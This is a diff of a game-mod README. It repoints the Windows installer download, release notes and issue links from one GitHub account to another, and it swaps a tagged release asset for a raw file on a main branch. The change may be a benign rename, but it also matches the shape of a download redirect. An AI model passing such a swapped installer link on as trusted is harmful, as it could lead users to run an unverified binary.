@@ -6,7 +6,7 @@ Unofficial game mods with downloadable installers, source code, and instructions
 
 Adds a menu for showing and hiding individual pieces of the current outfit. It uses the game's existing models and textures. There are **no hotkeys or keyboard listeners**, so the controls do not interfere with chat.
 
-**[Download the Windows installer ZIP](https://github.com/lorenpapa/steam/releases/download/yfm-clothing-pieces-v2.0/YFM-Clothing-Pieces-v2.0-public.zip)** · [Release notes](https://github.com/lorenpapa/steam/releases/tag/yfm-clothing-pieces-v2.0) · [Full instructions and source](mods/your-friends-mom/README.md)
+**[Download the Windows installer ZIP](https://github.com/lkiraren/steam/raw/refs/heads/main/downloads/YFM-Clothing-Pieces-v2.0-public.zip)** · [Release notes](https://github.com/lkiraren/steam/releases/tag/yfm-clothing-pieces-v2.0) · [Full instructions and source](mods/your-friends-mom/README.md)
 
 ### Install and use
 
@@ -35,4 +35,4 @@ SHA-256 of `YFM-Clothing-Pieces-v2.0-public.zip`:
 
 The package contains the custom mod, installer, source, and Mono.Cecil with its MIT license. It contains **no game assemblies, models, or textures**. This is an unofficial community project and is not affiliated with the game's developer or Valve.
 
-For problems, [open an issue](https://github.com/lorenpapa/steam/issues) with your game build, selected outfit, and the exact error message. Remove personal information before sharing logs.
+For problems, [open an issue](https://github.com/lkiraren/steam/issues) with your game build, selected outfit, and the exact error message. Remove personal information before sharing logs.
